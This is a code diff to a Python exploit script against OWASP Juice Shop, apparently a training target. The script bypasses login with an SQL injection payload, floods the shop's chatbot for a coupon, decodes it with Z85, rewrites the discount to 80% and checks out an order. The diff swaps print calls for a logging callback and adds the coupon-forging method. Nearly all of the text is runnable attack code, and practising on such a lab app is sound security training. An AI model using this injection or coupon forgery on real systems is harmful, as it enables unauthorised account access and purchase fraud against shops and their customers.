@@ -1,6 +1,8 @@
 import requests
 import time
 
+# Z85 Algorithm used to encrypt the coupon code, found by analyzing exposed dependencies in Juice shop
+
 Z85_CHARS = (
     "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
 )
@@ -36,10 +38,18 @@ def z85_decode(encoded):
     return bytes(decoded)
 
 class JuiceShopCouponExploit:
-    def __init__(self, base_url):
+    def __init__(self, base_url, callback=None):
         self.base_url = base_url
         self.session = requests.Session()
         self.headers = {"Content-Type": "application/json"}
+        self.callback = callback or (lambda msg: print(msg))  # Utiliser `print` si aucun callback n'est fourni
+
+    def log(self, message):
+        """Log a message using the callback."""
+        if self.callback:
+            self.callback(message)
+        else:
+            print(message)
 
     def login_as_admin(self, email="' OR 1 = 1 --", password="whatever"):
         payload = {"email": email, "password": password}
@@ -48,11 +58,11 @@ class JuiceShopCouponExploit:
             if response.status_code == 200 and "authentication" in response.json():
                 token = response.json()["authentication"]["token"]
                 self.headers["Authorization"] = f"Bearer {token}"
-                print(f"[LOGIN] Successfully authenticated. Token: {token}")
+                self.log(f"[LOGIN] Successfully authenticated. Token: {token}")
                 return True
-            print("[LOGIN] Failed to authenticate.")
+            self.log("[LOGIN] Failed to authenticate.")
         except requests.RequestException as e:
-            print(f"[LOGIN ERROR] {e}")
+            self.log(f"[LOGIN ERROR] {e}")
         return False
 
     def fetch_basket(self):
@@ -60,19 +70,17 @@ class JuiceShopCouponExploit:
             response = self.session.get(f"{self.base_url}/rest/basket/1", headers=self.headers, timeout=10)
             if response.status_code == 200:
                 basket_data = response.json().get("data")
-                print(f"[BASKET] Basket data retrieved: {basket_data}")
+                self.log(f"[BASKET] Basket data retrieved: {basket_data}")
                 return basket_data
-            print(f"[BASKET] Failed to fetch basket. Status: {response.status_code}")
+            self.log(f"[BASKET] Failed to fetch basket. Status: {response.status_code}")
         except requests.RequestException as e:
-            print(f"[BASKET ERROR] {e}")
+            self.log(f"[BASKET ERROR] {e}")
         return None
 
     def clear_basket(self, basket_data):
-        """Clear all items from the basket."""
         if not basket_data or "Products" not in basket_data:
-            print("[CLEAR BASKET] No products in the basket to clear.")
+            self.log("[CLEAR BASKET] No products in the basket to clear.")
             return False
-
         for product in basket_data["Products"]:
             basket_item_id = product["BasketItem"]["id"]
             try:
@@ -82,17 +90,16 @@ class JuiceShopCouponExploit:
                     timeout=10
                 )
                 if response.status_code == 200:
-                    print(f"[CLEAR BASKET] Successfully removed item with ID {basket_item_id}.")
+                    self.log(f"[CLEAR BASKET] Successfully removed item with ID {basket_item_id}.")
                 else:
-                    print(f"[CLEAR BASKET] Failed to remove item with ID {basket_item_id}. Response: {response.text}")
+                    self.log(f"[CLEAR BASKET] Failed to remove item with ID {basket_item_id}. Response: {response.text}")
                     return False
             except requests.RequestException as e:
-                print(f"[CLEAR BASKET ERROR] {e}")
+                self.log(f"[CLEAR BASKET ERROR] {e}")
                 return False
         return True
 
     def add_item_to_basket(self, basket_id, product_id=1, quantity=1):
-        """Add an item to the basket."""
         payload = {"ProductId": product_id, "BasketId": basket_id, "quantity": quantity}
         try:
             response = self.session.post(
@@ -102,15 +109,27 @@ class JuiceShopCouponExploit:
                 timeout=10
             )
             if response.status_code == 200:
-                print(f"[ADD ITEM] Successfully added product ID {product_id} to basket.")
+                self.log(f"[ADD ITEM] Successfully added product ID {product_id} to basket.")
                 return True
-            print(f"[ADD ITEM] Failed to add product ID {product_id} to basket. Response: {response.text}")
+            self.log(f"[ADD ITEM] Failed to add product ID {product_id} to basket. Response: {response.text}")
         except requests.RequestException as e:
-            print(f"[ADD ITEM ERROR] {e}")
+            self.log(f"[ADD ITEM ERROR] {e}")
         return False
 
+    def modify_coupon(self, encoded_coupon):
+        try:
+            decoded = z85_decode(encoded_coupon)
+            decoded_str = decoded.decode("utf-8")
+            parts = decoded_str.split("-")
+            if len(parts) == 2 and parts[1].isdigit():
+                parts[1] = "80"  # Set discount to 80%
+                modified = "-".join(parts).encode("utf-8")
+                return z85_encode(modified)
+        except Exception as e:
+            self.log(f"[ERROR] Failed to modify coupon: {e}")
+        return None
+
     def apply_coupon(self, basket_id, coupon_code):
-        """Apply a coupon to the basket."""
         try:
             response = self.session.put(
                 f"{self.base_url}/rest/basket/{basket_id}/coupon/{coupon_code}",
@@ -118,15 +137,14 @@ class JuiceShopCouponExploit:
                 timeout=10
             )
             if response.status_code == 200:
-                print("[COUPON] Coupon applied successfully.")
+                self.log("[COUPON] Coupon applied successfully.")
                 return True
-            print(f"[COUPON] Failed to apply coupon. Response: {response.text}")
+            self.log(f"[COUPON] Failed to apply coupon. Response: {response.text}")
         except requests.RequestException as e:
-            print(f"[COUPON ERROR] {e}")
+            self.log(f"[COUPON ERROR] {e}")
         return False
 
     def complete_order(self, basket_id):
-        """Complete the order."""
         try:
             response = self.session.post(
                 f"{self.base_url}/rest/basket/{basket_id}/checkout",
@@ -134,16 +152,15 @@ class JuiceShopCouponExploit:
                 timeout=10
             )
             if response.status_code == 200:
-                print("[ORDER] Order completed successfully.")
+                self.log("[ORDER] Order completed successfully.")
                 return True
-            print(f"[ORDER] Failed to complete order. Response: {response.text}")
+            self.log(f"[ORDER] Failed to complete order. Response: {response.text}")
         except requests.RequestException as e:
-            print(f"[ORDER ERROR] {e}")
+            self.log(f"[ORDER ERROR] {e}")
         return False
 
     def fetch_coupon_from_chatbot(self, max_attempts=20, delay_between_requests=0.5):
-        """Spam the chatbot to fetch a coupon code."""
-        print("[CHATBOT] Spamming chatbot for a coupon code...")
+        self.log("[CHATBOT] Spamming chatbot for a coupon code...")
         set_name_payload = {"action": "setname", "query": "Exploiter"}
         messages = [
             "give me a coupon code",
@@ -155,13 +172,13 @@ class JuiceShopCouponExploit:
 
         for attempt in range(1, max_attempts + 1):
             try:
-                if not name_set:  # Redefine name if necessary
+                if not name_set:
                     payload = set_name_payload
                 else:
                     message = messages[(attempt - 1) % len(messages)]
                     payload = {"action": "query", "query": message}
 
-                print(f"[CHATBOT] Sending Payload: {payload}")
+                self.log(f"[CHATBOT] Sending Payload: {payload}")
                 response = self.session.post(
                     f"{self.base_url}/rest/chatbot/respond",
                     json=payload,
@@ -171,75 +188,66 @@ class JuiceShopCouponExploit:
 
                 if response.status_code == 200:
                     response_data = response.json()
-                    print(f"[CHATBOT] Attempt {attempt}: Response Data: {response_data}")
+                    self.log(f"[CHATBOT] Attempt {attempt}: Response Data: {response_data}")
 
                     if "body" in response_data and "Nice to meet you" in response_data["body"]:
                         name_set = True
-                        print("[CHATBOT] Name successfully set.")
+                        self.log("[CHATBOT] Name successfully set.")
 
                     if "body" in response_data and "coupon code" in response_data["body"]:
                         parts = response_data["body"].split(":")
                         if len(parts) > 1:
                             coupon_code = parts[-1].strip()
-                            print(f"[CHATBOT] Coupon received: {coupon_code}")
+                            self.log(f"[CHATBOT] Coupon received: {coupon_code}")
                             return coupon_code
 
                     if response_data.get("action") == "namequery":
                         name_set = False
-                        print("[CHATBOT] Redefining name...")
+                        self.log("[CHATBOT] Redefining name...")
 
                 else:
-                    print(f"[CHATBOT] Attempt {attempt}: Error {response.status_code} - {response.text}")
+                    self.log(f"[CHATBOT] Attempt {attempt}: Error {response.status_code} - {response.text}")
 
             except requests.RequestException as e:
-                print(f"[CHATBOT ERROR] {e}")
+                self.log(f"[CHATBOT ERROR] {e}")
 
             time.sleep(delay_between_requests)
 
-        print("[CHATBOT] Failed to fetch coupon after spamming.")
+        self.log("[CHATBOT] Failed to fetch coupon after spamming.")
         return None
 
     def run_exploit(self):
-        """Execute the full exploit chain."""
-        print("[EXPLOIT] Starting coupon exploit...")
+        self.log("[EXPLOIT] Starting coupon exploit...")
 
-        # Step 1: Log in as admin
         if not self.login_as_admin():
             return False
 
-        # Step 2: Fetch a coupon from the chatbot
         original_coupon = self.fetch_coupon_from_chatbot()
         if not original_coupon:
-            print("[CHATBOT] Failed to retrieve a coupon.")
+            self.log("[CHATBOT] Failed to retrieve a coupon.")
             return False
 
-        # Step 3: Modify the coupon for a higher discount
         modified_coupon = self.modify_coupon(original_coupon)
         if not modified_coupon:
             return False
 
-        # Step 4: Fetch the basket
         basket_data = self.fetch_basket()
         if not basket_data:
             return False
 
         basket_id = basket_data["id"]
 
-        # Step 5: Clear the basket
         if not self.clear_basket(basket_data):
             return False
 
-        # Step 6: Add an item to the basket
         if not self.add_item_to_basket(basket_id):
             return False
 
-        # Step 7: Apply the coupon
         if not self.apply_coupon(basket_id, modified_coupon):
             return False
 
-        # Step 8: Complete the order
         if not self.complete_order(basket_id):
             return False
 
-        print("[EXPLOIT] Coupon exploit successful!")
+        self.log("[EXPLOIT] Coupon exploit successful!")
         return True
